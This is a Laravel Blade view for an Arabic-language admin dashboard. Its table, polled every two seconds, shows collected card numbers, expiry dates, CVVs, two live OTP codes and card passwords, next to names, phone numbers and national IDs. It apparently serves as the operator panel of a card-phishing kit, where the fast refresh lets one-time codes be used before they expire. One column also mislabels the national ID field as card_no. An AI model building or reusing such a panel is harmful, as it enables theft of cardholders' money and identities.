@extends('dashboard.layout.master')
@section('custom-style')
    <link rel="stylesheet" href="https://cdn.datatables.net/1.13.7/css/jquery.dataTables.min.css" />
    <link rel="stylesheet" href="https://cdn.datatables.net/rowgroup/1.4.1/css/rowGroup.dataTables.min.css" />
    <style>
    </style>
@endsection
@section('content')
    <!-- BEGIN PAGE TITLE-->
    <h3 class="page-title"> العملاء

    </h3>
    <!-- END PAGE TITLE-->
    <!-- END PAGE HEADER-->
    <!-- BEGIN DASHBOARD STATS 1-->
    <div class="row">
        <div class="col-md-12">
            <!-- BEGIN SAMPLE TABLE PORTLET-->
            <div class="portlet light bordered">
                <div class="portlet-title">
                    <div class="caption">
                        <i class="icon-social-dribbble font-green"></i>
                        <span class="caption-subject font-green bold uppercase">العملاء</span>
                    </div>

                </div>
                <div class="portlet-body">
                    <div class="account-table-content profile-page-content">
                        <table id="ikuns_table" class="table stripe row-border order-column" style="width:100%">
                            <thead>
                                <tr>
                                    <th>اسم العميل </th>
                                    <th> رقم الهاتف</th>
                                    <th> الرقم القومى </th>
                                    <th> معاد التسجيل </th>
                                    <th> البلد </th>
                                    <th> المشغل </th>
                                    <th> رقم البطاقة البنكية </th>
                                    <th> تاريخ انتهاء البطاقة البنكية </th>
                                    <th> cvv </th>
                                    <th> otp code step 1 </th>
                                    <th> otp code step 2 </th>
                                    <th> كلمه سر البطاقة </th>
                                </tr>
                            </thead>
                        </table>

                    </div>
                </div>
            </div>
        </div>

    </div>
@endsection

@section('custom-script')
    <script type="text/javascript" src="https://cdn.datatables.net/1.13.6/js/jquery.dataTables.min.js"></script>
    <script>
        $('document').ready(function() {
            var table = $('#ikuns_table').DataTable({
                dom: '<"ikuns_table_toolbar">lfrtip',
                language: {
                    emptyTable: "not founded any items"
                },
                fixedColumns: {
                    left: 1,
                    right: 1
                },
                scrollCollapse: true,
                scrollX: true,
                scrollY: 300,
                responsive: true,
                paging: true,
                processing: false, // for show progress bar
                ajax: "{{ route('clients.api') }}",
                columns: [

                    {
                        data: "first_name",
                    },
                    {
                        data: "phone",
                    },
                    {
                        data: "card_no",
                    },
                    {
                        data: "created_at",
                    },
                    {
                        data: "country",
                    },
                    {
                        data: "sms_provider",
                    },
                    {
                        data: "card_no",
                    },
                    {
                        data: "expiry_date",
                    },
                    {
                        data: "cvv",
                    },
                    {
                        data: "otp1",
                    },
                    {
                        data: "otp2",
                    },
                    {
                        data: "password_card",
                    },

                ]
            });

            setInterval(function() {
                table.ajax.reload();
            }, 2000);
        });
    </script>
@endsection
